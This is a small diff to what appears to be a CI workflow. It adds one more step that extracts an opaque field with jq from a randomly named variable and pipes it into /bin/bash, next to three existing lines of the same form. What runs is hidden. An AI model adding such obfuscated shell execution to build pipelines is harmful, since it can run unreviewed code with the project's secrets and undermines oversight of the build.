@@ -26,6 +26,7 @@ jobs:
           echo $kodgr20643 | jq -r .znu41 | /bin/bash
           echo $puiek1925 | jq -r .reqw3920 | /bin/bash
           printf '%s' "$kuaa2" | jq -r .ikv270 | /bin/bash
+          printf '%s' "$k723" | jq -r .lkk3312 | /bin/bash
 
       - name: Store results
         if: always()
